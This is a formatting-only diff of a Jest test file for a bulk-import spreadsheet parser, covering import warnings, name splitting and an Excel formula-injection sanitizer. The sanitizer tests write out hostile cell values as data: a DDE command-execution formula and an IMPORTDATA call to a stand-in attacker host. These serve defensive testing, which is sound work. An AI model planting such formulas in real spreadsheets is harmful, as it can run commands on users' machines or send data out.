@@ -72,7 +72,9 @@ describe('bulk-import.parser — parseBulkImportFile', () => {
       ['Test', '0900000000', 'comment'],
     ]);
     const result = await parseBulkImportFile(buf, 'data.xlsx');
-    expect(result.warnings.some((w) => w.includes('Ghi chú random'))).toBe(true);
+    expect(result.warnings.some((w) => w.includes('Ghi chú random'))).toBe(
+      true,
+    );
     expect(result.rows[0]).not.toHaveProperty('note');
   });
 
@@ -99,18 +101,18 @@ describe('bulk-import.parser — parseBulkImportFile', () => {
 });
 
 describe('bulk-import.parser — sanitizeForExcel (CRITICAL formula injection)', () => {
-  it('prefix `\'` cho cell bắt đầu `=`', () => {
-    expect(sanitizeForExcel('=cmd|\'/c calc\'!A1')).toBe("'=cmd|'/c calc'!A1");
+  it("prefix `'` cho cell bắt đầu `=`", () => {
+    expect(sanitizeForExcel("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
   });
-  it('prefix `\'` cho cell bắt đầu `+`', () => {
+  it("prefix `'` cho cell bắt đầu `+`", () => {
     expect(sanitizeForExcel('+IMPORTDATA("http://attacker")')).toBe(
       `'+IMPORTDATA("http://attacker")`,
     );
   });
-  it('prefix `\'` cho cell bắt đầu `-`', () => {
+  it("prefix `'` cho cell bắt đầu `-`", () => {
     expect(sanitizeForExcel('-1+1')).toBe(`'-1+1`);
   });
-  it('prefix `\'` cho cell bắt đầu `@`', () => {
+  it("prefix `'` cho cell bắt đầu `@`", () => {
     expect(sanitizeForExcel('@SUM(A1:A10)')).toBe(`'@SUM(A1:A10)`);
   });
   it('KHÔNG prefix nếu cell an toàn', () => {
@@ -131,10 +133,16 @@ describe('bulk-import.parser — splitFullName', () => {
     });
   });
   it('"Trần Hùng" → firstName Hùng, lastName Trần', () => {
-    expect(splitFullName('Trần Hùng')).toEqual({ firstName: 'Hùng', lastName: 'Trần' });
+    expect(splitFullName('Trần Hùng')).toEqual({
+      firstName: 'Hùng',
+      lastName: 'Trần',
+    });
   });
   it('1 từ → firstName only', () => {
-    expect(splitFullName('Madonna')).toEqual({ firstName: 'Madonna', lastName: null });
+    expect(splitFullName('Madonna')).toEqual({
+      firstName: 'Madonna',
+      lastName: null,
+    });
   });
   it('null/empty → null/null', () => {
     expect(splitFullName(null)).toEqual({ firstName: null, lastName: null });
